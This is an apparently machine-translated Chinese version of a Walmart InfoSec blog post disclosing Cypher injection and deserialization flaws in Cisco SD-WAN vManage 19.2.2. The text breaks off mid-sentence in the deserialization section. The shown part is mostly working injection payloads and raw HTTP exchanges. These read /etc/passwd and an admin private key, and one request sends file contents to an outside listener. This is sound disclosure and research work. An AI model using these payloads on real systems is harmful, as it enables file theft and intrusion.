<html>
<head>
<title>Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">入侵思科SD-WAN vManage 19.2.2 —从CSRF到远程代码执行</h1>
<blockquote>原文：<a href="https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77?source=collection_archive---------3-----------------------#2020-08-05">https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77?source=collection_archive---------3-----------------------#2020-08-05</a></blockquote><div><div class="ds gv gw gx gy gz"/><div class="ha hb hc hd he"><figure class="hg hh ez fb hi hj er es paragraph-image"><div class="er es hf"><img src="../Images/864bd0585d44f0869d8034f68c8476cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:658/format:webp/1*gI1jxOlDP-0ADzJMPOBrJg.png"/></div></figure><div class=""/><h1 id="e5a6" class="il im ho bd in io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji bi translated"><strong class="ak">简介</strong></h1><p id="3de7" class="pw-post-body-paragraph jj jk ho jl b jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg ha bi translated">保住财富第一的位置既令人兴奋，又富有挑战性，同时也很有回报。沃尔玛的全球技术足迹由许多技术实施组成，为安全从业者提供了无与伦比的挑战和回报。沃尔玛信息安全团队与供应商合作伙伴协作，不断提高整个技术社区的产品和服务的安全卫生。沃尔玛及其合作伙伴非常重视安全，并致力于积极影响强大的安全文化。</p><p id="90d4" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">沃尔玛信息安全公司与思科系统公司紧密合作，负责任地披露了本博客中讨论的安全漏洞。思科系统公司以一种紧迫感和坚定的承诺及时解决了这些漏洞。</p><p id="28b7" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">Cisco SD-WAN vManage是一个应用程序，是更广泛的SD-WAN解决方案的一部分，用于管理和配置整个Cisco SD-WAN基础设施。今年早些时候，我们的业务用户聘请Walmart InfoSec团队评估vManage的安全状况。在审计时，该产品的版本是19.2.0，我注意到了一些cypher注入漏洞。我向Cisco PSIRT报告了这些问题，他们表示这些发现是重复的。几周后，synacktiv团队发布了一篇博客，介绍他们对vManage的发现，其中包括cypher注入漏洞。虽然他们披露的cypher注入问题与我发现的情况不同，但我认为潜在的根本原因已由思科纠正。又过了一周，业务用户请求对vManage的最新版本(19.2.2)进行验证测试。我对该产品运行了概念验证，并注意到密码注入实例仍然存在。由于这种情况的结果，我决定在工作时间之外投入一些个人时间，看看还有什么其他的漏洞。在审查结束时，我注意到了6种类型的漏洞。这篇博文分享了一个从CSRF到RCE的链式矢量。</p><h1 id="16de" class="il im ho bd in io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji bi translated">第一部分Cypher注射液的故事(CSCvt65026)</h1><p id="d0d5" class="pw-post-body-paragraph jj jk ho jl b jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg ha bi translated">当我测试不同的vManage端点时，我观察到以下情况:</p><p id="13dc" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">请求:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="672a" class="kv im ho kr b fi kw kx l ky kz">GET /dataservice/device/counters?deviceId=<strong class="kr hp">%27</strong> HTTP/1.1<br/>Host: &lt;redacted&gt;<br/>Connection: close<br/>Accept: application/json, text/plain, */*<br/>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36<br/>Content-Type: application/json<br/>Referer: https://&lt;redacted&gt;/index.html<br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-US,en;q=0.9<br/>Cookie: JSESSIONID=ExzAN7iecW940iRO1JkGyxTQolUwC_BK906aD484.75b07999–549d-412b-80f2–5091dbc85e87</span></pre><p id="4c6f" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">回应:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="ea49" class="kv im ho kr b fi kw kx l ky kz">X-Frame-Options: DENY<br/>Date: Wed, 18 Mar 2020 20:45:35 GMT<br/>Connection: close<br/>Vary: Accept-Encoding<br/>Strict-Transport-Security: max-age=31536000; includeSubDomains<br/>X-Content-Type-Options: nosniff<br/>Content-Type: application/json</span><span id="303b" class="kv im ho kr b fi la kx l ky kz">Invalid input ''': expected whitespace, '.', node labels, '[', "=~", IN, STARTS, ENDS, CONTAINS, IS, '^', '*', '/', '%', '+', '-', '=', "&lt;&gt;", "!=", '&lt;', '&gt;', "&lt;=", "&gt;=", AND, XOR, OR, LOAD CSV, FROM, INTO, START, MATCH, UNWIND, MERGE, CREATE GRAPH &gt;&gt;, CREATE &gt;&gt; GRAPH, CREATE GRAPH, CREATE, SET, DELETE GRAPHS, DELETE, REMOVE, FOREACH, WITH, CALL, PERSIST, RELOCATE, RETURN, SNAPSHOT, UNION, ';' or end of input (line 1, column 168 (offset: 167))<br/>"Match (d:vmanagedbDEVICENODE) Optional Match ()-[a:vmanagedbREBOOTHISTORY]-(d) With a,d Optional Match ()-[e:vmanagedbCRASHLOG]-(d) With a,d,e Where d.`system-ip` = ''' return d.`system-ip` as `system-ip`,d.`number-vsmart-control-connections` as `number-vsmart-control-connections`,d.`expectedControlConnections` as `expectedControlConnections`,d.`ompPeersUp` as `ompPeersUp`,d.`ompPeersDown` as `ompPeersDown`,d.`bfdSessionsUp` as `bfdSessionsUp`,d.`bfdSessionsDown` as `bfdSessionsDown`,count(distinct a) as rebootCount, count(distinct e) as crashCount"</span></pre><p id="69e4" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">在谷歌搜索应用程序响应的一些内容时，我了解到这是一个Neo4j数据库错误。用户输入似乎也会影响查询，所以我想弄清楚如何利用以及利用什么。</p><p id="3963" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">有两篇博文谈到了Neo4j的cypher注射液，这是关于这个话题的一个很好的起点。第一篇博文描述了如何扩展现有的查询，使之超越原来的查询，第二篇博文介绍了cypher语言中的“LOAD CSV”命令，该命令可以执行基于HTTP的请求。</p><p id="4b37" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我开始阅读documentation⁴关于密码语言，并了解到“加载CSV”支持“文件”和“ftp”协议。我能够利用“文件”来访问本地磁盘内容。</p><p id="74da" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">查询:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="bb9f" class="kv im ho kr b fi kw kx l ky kz">-1' or '1'='1' load csv from 'file:///etc/passwd' as line return line as `system-ip`//</span></pre><p id="7788" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">请求:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="2a3e" class="kv im ho kr b fi kw kx l ky kz">GET /dataservice/device/counters?deviceId=<strong class="kr hp">-1%27%20or%20%271%27%3d%271%27%20load%20csv%20from%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%20as%20line%20return%20line%20as%20%60system-ip%60%2f%2f</strong> HTTP/1.1<br/>Host: &lt;redacted&gt;<br/>Connection: close<br/>Accept: application/json, text/plain, */*<br/>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36<br/>Content-Type: application/json<br/>Referer: https://&lt;redacted&gt;/index.html<br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-US,en;q=0.9<br/>Cookie: JSESSIONID=ExzAN7iecW940iRO1JkGyxTQolUwC_BK906aD484.75b07999–549d-412b-80f2–5091dbc85e87</span></pre><p id="36ee" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">回应:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="cabe" class="kv im ho kr b fi kw kx l ky kz">HTTP/1.1 200 OK<br/>Cache-Control: no-cache, no-store, must-revalidate<br/>X-XSS-Protection: 1; mode=block<br/>X-Frame-Options: DENY<br/>Date: Wed, 18 Mar 2020 21:19:36 GMT<br/>Connection: close<br/>Vary: Accept-Encoding<br/>Strict-Transport-Security: max-age=31536000; includeSubDomains<br/>X-Content-Type-Options: nosniff<br/>Content-Type: application/json</span><span id="347e" class="kv im ho kr b fi la kx l ky kz">{“header”:{“generatedOn”:1584566376401},”data”:[{“system-ip”:[“root:x:0:0:root:/home/root:/bin/sh”]},{“system-ip”:[“daemon:x:1:1:daemon:/usr/sbin:/bin/sh”]},{“system-<br/>… snipped …<br/>ip”:[“vmanage:x:310:310::/home/vmanage:/bin/false”]},{“system-ip”:[“radvd:x:311:65534::/var/lib/radvd:/bin/false”]},{“system-ip”:[“tss:x:312:312::/var/lib/tpm:/bin/false”]},{“system-ip”:[“admin:x:1000:1000::/home/admin:/usr/sbin/viptela_cli”]}<br/>… snipped …</span></pre><p id="f11f" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我发现的一个更有趣的文件是用户“vmanage-admin”的私钥，它存储在“/etc/viptela/中。ssh/id_dsa”。我利用密码注入漏洞来检索私钥，希望我可以SSH到这个盒子中。结果是这个特定用户禁用了SSH，但是允许SCP访问。我最终使用SCP和递归下载来获得应用程序的WAR包。</p><p id="f566" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">除了删除私钥，我还观察到，如果向“LOAD CSV”命令提供了无效的文件路径，应用程序可能会返回反映文件路径的错误。</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="0305" class="kv im ho kr b fi kw kx l ky kz">HTTP/1.1 500 Internal Server Error<br/>Cache-Control: no-cache, no-store, must-revalidate<br/>X-XSS-Protection: 1; mode=block<br/>X-Frame-Options: DENY<br/>Date: Wed, 18 Mar 2020 21:31:48 GMT<br/>Connection: close<br/>Vary: Accept-Encoding<br/>Strict-Transport-Security: max-age=31536000; includeSubDomains<br/>X-Content-Type-Options: nosniff<br/>Content-Type: application/json</span><span id="3ab4" class="kv im ho kr b fi la kx l ky kz">{“error”:{“message”:”Server error”,”details”:”Couldn’t load the external resource at: file:/etc/passxxxwd”,”code”:”REST0001"}}</span></pre><p id="ab0c" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">这被证明是攻击其他cypher injection实例的一个重要原语。</p><p id="8d9b" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我反编译了这个包，观察这个缺陷是如何实现的。易受攻击的代码可以追溯到:</p><p id="3efb" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><em class="lb">/we b-INF/classes/com/VIP tela/v manage/server/device/common/device Dao . class</em></p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="03a9" class="kv im ho kr b fi kw kx l ky kz">public JsonArray getDeviceCounters(String systemIP) {<br/>   VGraphDataStore dataStore = this.getDatabaseManager().getGraphDataStore();<br/>   Throwable var3 = null;</span><span id="0e58" class="kv im ho kr b fi la kx l ky kz">JsonArray var5;<br/>   try {<br/>      Iterable&lt;Vertex&gt; devList = (Iterable) <strong class="kr hp">dataStore.createQueryBuilder().rawQuery(() -&gt; {  return this.createNeo4JDeviceCountersQuery(systemIP); }).build().execute();</strong><br/>      var5 = JsonUtil.createJSONArrayBuilder(devList).build();</span><span id="ec73" class="kv im ho kr b fi la kx l ky kz">      … snipped …</span><span id="0976" class="kv im ho kr b fi la kx l ky kz">private String createNeo4JDeviceCountersQuery(String systemIP) {<br/>   StringBuilder fields = new StringBuilder();<br/>   List&lt;String&gt; projections = Arrays.asList("system-ip", "number-vsmart-control-connections", "expectedControlConnections", "ompPeersUp", "ompPeersDown", "bfdSessionsUp", "bfdSessionsDown");<br/>   projections.forEach((s) -&gt; {<br/>      fields.append("d.`").append(s).append("` as `").append(s).append("`,"); });<br/>   fields.append("").append("count(distinct a) as rebootCount");<br/>   fields.append(", ").append("count(distinct e) as crashCount");<br/>   String query;<br/>   if (systemIP != null) {<br/>   query = "Match (d:&amp;&amp;DeviceNode) Optional Match ()-[a:&amp;&amp;RebootHistory]-(d) With a,d Optional Match ()-[e:&amp;&amp;CrashLog]-(d) With a,d,e Where d.`system-ip` = '" + systemIP + "' return " + fields.toString();<br/>   } else {<br/>   query = "Match (d:&amp;&amp;DeviceNode) Optional Match ()-[a:&amp;&amp;RebootHistory]-(d) With a,d Optional Match ()-[e:&amp;&amp;CrashLog]-(d) With a,d,e return " + fields.toString();<br/>   }<br/>   return query;<br/>}</span></pre><p id="27cb" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我删除了“rawQuery”一词，以识别此类问题的其他变体。总的来说，我找到了另外六个实例。其中一些是盲注，利用它们有点棘手，但并不太难。</p><p id="e824" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我遇到的一个易受攻击的实例只会返回neo4J错误或常规数据输出，这让我很想利用它。我记得读过Pieter Hiele的博客post⁵，他把一个盲目的XXE变成了通过错误输出返回内容，我认为这个概念可能是一个潜在的解决方案。</p><p id="4fcf" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我如下链接了两个“加载CSV”。第一个“LOAD CSV”将从本地磁盘检索内容，第二个“LOAD CSV”将收集的内容作为URL加载，该URL不存在，因此将显示在错误:</p><p id="9e44" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">查询:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="4936" class="kv im ho kr b fi kw kx l ky kz">-1']) or 1=1  load csv from 'file:///etc/passwd' as line fieldterminator '\n' load csv from 'file:///'+line as sigh return 0 as count//</span></pre><p id="4427" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">请求:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="56a0" class="kv im ho kr b fi kw kx l ky kz">GET /dataservice/device/bfd/sites/summary?vpnId=<strong class="kr hp">-1%27%5d%29%20or%201%3d1%20%20load%20csv%20from%20%27file%3a%2f%2f%2fetc/passwd%27%20as%20line%20fieldterminator%20%27%0a%27%20load%20csv%20from%20%27file%3a%2f%2f%2f%27%2bline%20as%20sigh%20return%200%20as%20count%2f%2f</strong> HTTP/1.1<br/>Host: &lt;redacted&gt;<br/>Connection: close<br/>Accept: application/json, text/plain, */*<br/>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36<br/>Content-Type: application/json<br/>Referer: https://&lt;redacted&gt;/index.html<br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-US,en;q=0.9<br/>Cookie: JSESSIONID=ExzAN7iecW940iRO1JkGyxTQolUwC_BK906aD484.75b07999–549d-412b-80f2–5091dbc85e87</span></pre><p id="5c7d" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">回应:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="684e" class="kv im ho kr b fi kw kx l ky kz">HTTP/1.1 500 Internal Server Error<br/>Cache-Control: no-cache, no-store, must-revalidate<br/>X-XSS-Protection: 1; mode=block<br/>X-Frame-Options: DENY<br/>Date: Wed, 18 Mar 2020 21:38:14 GMT<br/>Connection: close<br/>Vary: Accept-Encoding<br/>Strict-Transport-Security: max-age=31536000; includeSubDomains<br/>X-Content-Type-Options: nosniff<br/>Content-Type: application/json</span><span id="46ac" class="kv im ho kr b fi la kx l ky kz">{“error”:{“message”:”Server error”,”details”:”Type mismatch: expected String but was List&lt;String&gt; (line 10, column 27 (offset: 893))\n\”’ load csv from ‘file:///’+line as sigh return 0 as count//’] ) return count(distinct siteId) as count\”\n ^”,”code”:”REST0001"}}</span></pre><p id="8bff" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">发生了什么事？原来第一个“LOAD CSV”读取整个文件，但是文件中的每一行都作为一个字符串存储在一个列表数据结构中。从“列表<string>到“字符串”的类型转换是不可能的，我得到了错误。</string></p><p id="64c9" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">拼图的最后一块是通过字符串连接将“List <string>转换成“String”。经过一些谷歌搜索和反复试验，我使用“REDUCE”和“CASE”命令提出了一个可行的解决方案:</string></p><p id="0266" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">查询:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="5bbd" class="kv im ho kr b fi kw kx l ky kz">load csv from ‘file:///etc/passwd’ as line fieldterminator ‘\n’ load csv from ‘file:///’+ reduce(h=head(line),t in tail(line) | case when t is null then h else h+t end) as sigh</span></pre><p id="ea40" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">请求:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="1a68" class="kv im ho kr b fi kw kx l ky kz">GET /dataservice/device/bfd/sites/summary?vpnId=-<strong class="kr hp">1%27%5d%29%20or%201%3d1%20%20load%20csv%20from%20%27file%3a%2f%2f%2fetc/passwd%27%20as%20line%20fieldterminator%20%27%0a%27%20load%20csv%20from%20%27file%3a%2f%2f%2f%27%2b%20reduce%28h%3dhead%28line%29%2ct%20in%20tail%28line%29%20%7c%20case%20when%20t%20is%20null%20then%20h%20else%20h%2b%27%20%27%2bt%20end%29%20as%20sigh%20return%200%20as%20count%2f%2f</strong> HTTP/1.1<br/>Host: &lt;redacted&gt;<br/>Connection: close<br/>Accept: application/json, text/plain, */*<br/>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36<br/>Content-Type: application/json<br/>Referer: https://&lt;redacted&gt;/index.html<br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-US,en;q=0.9<br/>Cookie: JSESSIONID=Km457qpvFQoFY4GgAIUbpsHwp6kdUzidkCvOOU81.00aeedad-3dd0-434a-8f3d-bcab23725110</span></pre><p id="db22" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">回应:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="61fc" class="kv im ho kr b fi kw kx l ky kz">HTTP/1.1 500 Internal Server Error<br/>Cache-Control: no-cache, no-store, must-revalidate<br/>X-XSS-Protection: 1; mode=block<br/>X-Frame-Options: DENY<br/>Date: Wed, 22 Apr 2020 14:13:26 GMT<br/>Connection: close<br/>Vary: Accept-Encoding<br/>Strict-Transport-Security: max-age=31536000; includeSubDomains<br/>X-Content-Type-Options: nosniff<br/>Content-Type: application/json</span><span id="8231" class="kv im ho kr b fi la kx l ky kz">{"error":{"message":"Server error","details":"Illegal character in path at index 40: file:/root:x:0:0:root:/home/root:/bin/sh daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/false sys:x:3:3:sys:/dev:/bin/false sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/false man:x:6:12:man:/var/cache/man:/bin/false lp:x:7:7:lp:/var/spool/lpd:/bin/false mail:x:8:8:mail:/var/mail:/bin/false news:x:9:9:news:/var/spool/news:/bin/false uucp:x:10:10:uucp:/var/spool/uucp:/bin/false proxy:x:13:13:proxy:/bin:/bin/false www-data:x:33:33:www-<br/>… snipped …</span></pre><p id="9c2c" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我观察到的另一个例子是完全盲目的注射。不管传递给端点的是什么，它都将返回一个自定义的错误消息。我调整了我的双“LOAD CSV”向量，不再通过无效的文件路径过滤本地磁盘内容，而是提供一个合法的主机来通过网络提取内容。</p><p id="74f8" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">请求:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="c910" class="kv im ho kr b fi kw kx l ky kz">GET /dataservice/template/policy/assembly/vedge/<strong class="kr hp">1%27%7D%29-%5B%2A%2E%2E2%5D-%3E%28l%3A%26%26POLICYLISTSNODE%29%20return%201%20union%20load%20csv%20from%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%20as%20line%20fieldterminator%20%27%0A%27%20load%20csv%20from%20%27http%3A%2F%2F10.20.120.200%3A8080%2F%27%2B%20reduce%28h%3Dhead%28line%29%2Ct%20in%20tail%28line%29%20%7C%20case%20when%20t%20is%20null%20then%20h%20else%20h%2B%27%20%27%2Bt%20end%29%20as%20sigh%20return%201%2F%2F</strong> HTTP/1.1<br/>Host: &lt;redacted&gt;<br/>Connection: close<br/>Accept: application/json, text/plain, */*<br/>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36<br/>Referer: https://&lt;redacted&gt;/index.html<br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-US,en;q=0.9<br/>X-XSRF-TOKEN:B000E544E43074FED9E03A43C90D6CB86D20F77DF81BF3EA7C308844D1C8A5811FD2696D3161517EDEF50365208A63FE7B17<br/>Cookie: JSESSIONID=YN3G9wxni1-9d_r145EdZ83yXAzoXWyCHPDg8X1x.75b07999-549d-412b-80f2-5091dbc85e87</span></pre><p id="ea28" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">听众:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="f14b" class="kv im ho kr b fi kw kx l ky kz">$ nc -nlvvp 8080<br/>listening on [any] 8080 ...<br/>connect to [10.20.120.200] from (UNKNOWN) [&lt;redacted&gt;] 57986<br/>GET /root:x:0:0:root:/home/root:/bin/sh daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/false sys:x:3:3:sys:/dev:/bin/false sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/false man:x:6:12:man:/var/cache/man:/bin/false lp:x:7:7:lp:/var/spool/lpd:/bin/false mail:x:8:8:mail:/var/mail:/bin/false news:x:9:9:news:/var/spool/news:/bin/false uucp:x:10:10:uucp:/var/spool/uucp:/bin/false proxy:x:13:13:proxy:/bin:/bin/false www-data:x:33:33:www-data:/var/www:/bin/false backup:x:34:34:backup:/var/backups:/bin/false list:x:38:38:Mailing List Manager:/var/list:/bin/false irc:x:39:39:ircd:/var/run/ircd:/bin/false gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/false dhcp:x:298:298::/var/run/dhcp:/bin/false www:x:299:299::/var/www/localhost:/bin/sh quagga:x:300:300::/var/run/quagga:/bin/false sshd:x:301:301::/var/run/sshd:/bin/false log:x:302:302::/var/log:/bin/false ntp:x:303:303::/var/lib/ntp:/bin/false vmanage:x:310:310::/home/vmanage:/bin/false radvd:x:311:65534::/var/lib/radvd:/bin/false tss:x:312:312::/var/lib/tpm:/bin/false admin:x:1000:1000::/home/admin:/usr/sbin/viptela_cli vmanage-admin:x:1001:1001::/home/vmanage-admin:/usr/sbin/viptela_cli basic:x:1002:100::/home/basic:/usr/sbin/viptela_cli viptela-reserved-cloudops:x:1003:100::/home/viptela-reserved-cloudops:/usr/sbin/viptela_cli viptela-reserved-tac:x:1004:100::/home/viptela-reserved-tac:/usr/sbin/viptela_cli viptela-reserved-dca:x:1005:1005::/home/viptela-reserved-dca:/usr/sbin/viptela_cli viptela-reserved-cloud:x:1006:1006::/home/viptela-reserved-cloud:/usr/sbin/viptela_cli nobody:x:65534:65534:nobody:/nonexistent:/bin/false neteng:x:1007:100::/home/neteng:/usr/sbin/viptela_cli HTTP/1.1<br/>User-Agent: NeoLoadCSV_Java/1.8.0_162<br/>Host: 10.22.120.200:8080<br/>Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<br/>Connection: keep-alive</span></pre><p id="86df" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">应该注意的是，其中一些cypher injection实例没有CSRF令牌保护，因此未经验证的攻击者不仅可以利用它来渗透本地磁盘内容，还可以与本地网络服务(SSRF)进行交互，当然还可以改变图形数据库的内容。</p><h1 id="6a60" class="il im ho bd in io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji bi translated">第二部分—反序列化攻击(CSCvt70892)</h1><p id="7a8a" class="pw-post-body-paragraph jj jk ho jl b jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg ha bi translated">有了应用程序的反编译代码，我手动清理了代码库，找出了可能导致RCE的常见缺陷。当我搜索“readObject”时，以下结果引起了我的注意:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="eb38" class="kv im ho kr b fi kw kx l ky kz">… snipped …</span><span id="449d" class="kv im ho kr b fi la kx l ky kz">.//com/viptela/vmanage/server/sso/saml/storage/SAMLStorageDAO.java:106:                samlObject = (SAMLObject)samlMsgObjInputStream.<strong class="kr hp">readObject</strong>();</span><span id="dc7e" class="kv im ho kr b fi la kx l ky kz">… snipped …</span></pre><p id="ab27" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">深入研究源代码并追溯到源头，我将工作流标识如下:</p><figure class="km kn ko kp fd hj er es paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="er es lc"><img src="../Images/e9c3f6e12ccf27752f8f2d38693e3834.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0Kp_vhMAKWpHnGxl09EFig.png"/></div></div></figure><p id="0ae4" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 1。</strong>当用户访问服务提供商(Cisco SD-WAN v manage)[https://&lt;target&gt;/SAMLLoginServlet]时，应用程序会创建一个AuthnRequest对象，并使用SAMLRequest将用户重定向到身份提供商(Okta)。</p><p id="e138" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 2。</strong>当从SP到IdP的重定向发生在用户的浏览器上时，后端将AuthnRequest对象序列化为SAMLObject类型，并将其存储到neo4j数据库中。</p><p id="f763" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 3。</strong>用户通过身份提供商进行认证。</p><p id="34b7" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 4 </strong>。身份验证成功后，身份提供者将使用SAMLResponse将用户重定向回服务提供者。</p><p id="214b" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 5。</strong>服务器提供者将从neo4j数据库中检索序列化的SAMLObject并反序列化该对象。</p><p id="b9c2" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">如果在用户通过IdP进行身份验证之前，我可以用一个gadget替换数据库中序列化的“SAMLObject ”,我就可以利用这个反序列化漏洞。</p><p id="fffb" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">为了深入研究这个漏洞，我基于Cisco SD-WAN documentation⁶.设置了SSO建议不熟悉SAML 